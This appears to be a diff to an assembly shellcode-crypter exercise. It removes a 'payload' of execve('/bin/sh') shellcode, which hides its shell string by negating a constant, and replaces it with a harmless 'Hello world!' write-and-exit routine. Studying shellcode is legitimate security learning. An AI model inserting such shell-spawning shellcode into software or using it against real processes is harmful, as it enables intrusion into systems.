@@ -2,6 +2,8 @@
 
 ; Define variables in the data section
 section .data
+	hello:     db 'Hello world!',10
+	helloLen:  equ $-hello
 
 ; Code goes in the text section
 section .text
@@ -18,27 +20,15 @@ decrypt:
 
 align 16
 payload:
-    ;mov rbx, 0x68732f6e69622f2f
-    ;mov rbx, 0x68732f6e69622fff
-    ;shr rbx, 0x8
-    ;mov rax, 0xdeadbeefcafe1dea
-    ;mov rbx, 0xdeadbeefcafe1dea
-    ;mov rcx, 0xdeadbeefcafe1dea
-    ;mov rdx, 0xdeadbeefcafe1dea
-    xor eax, eax
-    mov rbx, 0xFF978CD091969DD1
-    neg rbx
-    push rbx
-    ;mov rdi, rsp
-    push rsp
-    pop rdi
-    cdq
-    push rdx
-    push rdi
-    ;mov rsi, rsp
-    push rsp
-    pop rsi
-    mov al, 0x3b
-    syscall
+	mov eax,4            ; 'write' system call = 4
+	mov ebx,1            ; file descriptor 1 = STDOUT
+	mov ecx,hello        ; string to write
+	mov edx,helloLen     ; length of string to write
+	int 80h              ; call the kernel
+
+	; Terminate program
+	mov eax,1            ; 'exit' system call
+	mov ebx,0            ; exit with error code 0
+	int 80h              ; call the kernel
 align 16
 .end:
